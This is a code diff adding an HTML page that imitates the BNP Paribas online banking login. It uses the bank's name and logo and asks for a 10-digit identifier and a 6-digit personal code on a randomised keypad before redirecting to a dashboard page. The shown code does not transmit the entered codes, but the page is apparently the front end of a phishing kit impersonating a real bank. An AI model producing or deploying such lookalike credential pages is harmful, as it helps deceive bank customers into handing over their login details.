@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="BNP.jpeg">
+<title>ACCESO – BNP PARIBAS</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial,sans-serif;
+  display:flex;
+  min-height:100vh;
+  background:#f5f7fb;
+}
+.left{
+  width:100%;
+  max-width:420px;
+  margin:auto;
+  background:#fff;
+  padding:25px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+}
+.language-selector{
+  align-self:flex-end;
+  margin-bottom:15px;
+}
+.language-selector select{
+  padding:6px;
+  border-radius:6px;
+}
+.logo img{width:90px;margin-bottom:10px}
+h2{font-size:16px;margin-bottom:10px}
+
+.input-id{
+  display:flex;
+  gap:6px;
+  margin-bottom:15px;
+}
+.input-id input{
+  width:28px;
+  height:42px;
+  font-size:20px;
+  text-align:center;
+  border:none;
+  border-bottom:2px solid #ccc;
+  outline:none;
+}
+.input-id input:focus{border-color:#1F883E}
+
+/* BOUTONS GLOBAUX */
+button{
+  width:100%;
+  padding:12px;
+  border-radius:30px;
+  border:none;
+  background:#9ca3af;
+  color:#fff;
+  font-size:15px;
+  opacity:.5;
+  pointer-events:none;
+}
+button.active{
+  background:#1F883E;
+  opacity:1;
+  pointer-events:auto;
+}
+
+/* ✅ CORRECTION CRITIQUE */
+#numpad button,
+#validateCode{
+  pointer-events:auto;
+}
+
+#codePersonnel{display:none;text-align:center}
+#dots{display:flex;justify-content:center;gap:10px;margin:15px 0}
+.dot{
+  width:10px;height:10px;
+  border-radius:50%;
+  border:1px solid #333;
+}
+
+#numpad{
+  display:grid;
+  grid-template-columns:repeat(5,42px);
+  gap:10px;
+  justify-content:center;
+}
+#numpad button{
+  width:42px;
+  height:42px;
+  border-radius:50%;
+  background:#eef2ff;
+  color:#000;
+  border:none;
+  font-size:16px;
+  opacity:1;
+}
+
+.links{text-align:center;margin-top:15px}
+.links a{display:block;color:#1F883E;text-decoration:underline}
+
+@media(max-width:768px){
+  body{
+    padding:10px;
+    flex-direction:column;
+  }
+  .left{
+    width:100%;
+    max-width:100%;
+    padding:15px;
+    margin:0;
+  }
+  .logo img{width:70px}
+  h2{font-size:14px}
+  .input-id{
+    flex-wrap:wrap;
+    justify-content:center;
+  }
+  .input-id input{
+    width:32px;
+    height:38px;
+    font-size:18px;
+  }
+  button{
+    padding:14px;
+    font-size:14px;
+  }
+  #numpad{
+    grid-template-columns:repeat(3,50px);
+    gap:8px;
+  }
+  #numpad button{
+    width:50px;
+    height:50px;
+    font-size:18px;
+  }
+  .language-selector{
+    align-self:center;
+    margin-bottom:20px;
+  }
+  .links{margin-top:20px}
+  .links a{font-size:13px}
+}
+
+@media(max-width:480px){
+  .left{
+    padding:10px;
+  }
+  .logo img{width:60px;margin-bottom:8px}
+  h2{font-size:12px}
+  .input-id{gap:4px}
+  .input-id input{
+    width:28px;
+    height:34px;
+    font-size:16px;
+  }
+  #numpad{
+    grid-template-columns:repeat(3,45px);
+    gap:6px;
+  }
+  #numpad button{
+    width:45px;
+    height:45px;
+    font-size:16px;
+  }
+  button{
+    padding:12px;
+    font-size:13px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="left">
+
+<div class="language-selector">
+<select id="langSelect">
+<option value="fr">Français</option>
+<option value="es">Español</option>
+<option value="en">English</option>
+<option value="de">Deutsch</option>
+<option value="it">Italiano</option>
+<option value="pl">Polski</option>
+<option value="sv">Svenska</option>
+</select>
+</div>
+
+<div class="logo"><img src="BNP.jpeg"></div>
+
+<h2 id="title"></h2>
+
+<div class="input-id">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+<input type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+</div>
+
+<button id="continueBtn"></button>
+
+<div id="codePersonnel">
+<h2 id="pinTitle"></h2>
+<div id="dots">
+<span class="dot"></span><span class="dot"></span><span class="dot"></span>
+<span class="dot"></span><span class="dot"></span><span class="dot"></span>
+</div>
+<div id="numpad"></div>
+<button id="validateCode"></button>
+</div>
+
+<div class="links">
+<a href="#" id="forgotId"></a>
+<a href="#" id="forgotPin"></a>
+</div>
+
+</div>
+
+<script>
+/* SÉCURITÉ */
+["copy","paste","cut"].forEach(e=>{
+  document.addEventListener(e,ev=>ev.preventDefault());
+});
+
+const inputs=document.querySelectorAll(".input-id input");
+const continueBtn=document.getElementById("continueBtn");
+const codeSection=document.getElementById("codePersonnel");
+const numpad=document.getElementById("numpad");
+const dots=document.querySelectorAll(".dot");
+const validateBtn=document.getElementById("validateCode");
+
+let code=[];
+
+function vibrate(ms){ if(navigator.vibrate) navigator.vibrate(ms); }
+
+inputs.forEach((input,i)=>{
+  input.addEventListener("input",()=>{
+    input.value=input.value.replace(/\D/g,"");
+    if(input.value && i<inputs.length-1) inputs[i+1].focus();
+    const ok=[...inputs].every(i=>i.value);
+    continueBtn.classList.toggle("active",ok);
+    vibrate(10);
+  });
+});
+
+continueBtn.onclick=()=>{
+  if(!continueBtn.classList.contains("active")) return;
+  vibrate(50);
+  codeSection.style.display="block";
+  generateNumpad();
+};
+
+function generateNumpad(){
+  numpad.innerHTML="";
+  [...Array(10).keys()].sort(()=>Math.random()-0.5).forEach(n=>{
+    const b=document.createElement("button");
+    b.textContent=n;
+    b.onclick=()=>enterCode(n);
+    numpad.appendChild(b);
+  });
+}
+
+function enterCode(n){
+  if(code.length>=6) return;
+  code.push(n);
+  dots[code.length-1].style.background="#1F883E";
+  vibrate(20);
+  if(code.length===6){
+    validateBtn.classList.add("active");
+  }
+}
+
+validateBtn.onclick=()=>{
+  vibrate([100,50,100]);
+  setTimeout(()=>location.href="dashboard.html",800);
+};
+
+/* LANGUES */
+const translations={
+fr:{title:"Votre identifiant",continue:"Continuer →",pin:"Votre code personnel",validate:"Valider →",forgotId:"Identifiant oublié ?",forgotPin:"Code personnel oublié ?"},
+es:{title:"Su identificador",continue:"Continuar →",pin:"Su código personal",validate:"Validar →",forgotId:"¿Olvidó su identificador?",forgotPin:"¿Olvidó su código personal?"},
+en:{title:"Your ID",continue:"Continue →",pin:"Your personal code",validate:"Validate →",forgotId:"Forgot your ID?",forgotPin:"Forgot your personal code?"},
+de:{title:"Ihre Kennung",continue:"Weiter →",pin:"Ihr persönlicher Code",validate:"Bestätigen →",forgotId:"Kennung vergessen?",forgotPin:"Code vergessen?"},
+it:{title:"Il tuo identificativo",continue:"Continua →",pin:"Il tuo codice personale",validate:"Conferma →",forgotId:"Hai dimenticato l'ID?",forgotPin:"Hai dimenticato il codice?"},
+pl:{title:"Twój identyfikator",continue:"Kontynuuj →",pin:"Twój kod osobisty",validate:"Zatwierdź →",forgotId:"Zapomniałeś ID?",forgotPin:"Zapomniałeś kodu?"},
+sv:{title:"Ditt ID",continue:"Fortsätt →",pin:"Din personliga kod",validate:"Bekräfta →",forgotId:"Glömt ID?",forgotPin:"Glömt kod?"}
+};
+
+const langSelect=document.getElementById("langSelect");
+function applyLang(l){
+  const t=translations[l];
+  title.textContent=t.title;
+  continueBtn.textContent=t.continue;
+  pinTitle.textContent=t.pin;
+  validateBtn.textContent=t.validate;
+  forgotId.textContent=t.forgotId;
+  forgotPin.textContent=t.forgotPin;
+}
+langSelect.onchange=()=>applyLang(langSelect.value);
+applyLang("fr");
+</script>
+
+</body>
+</html>
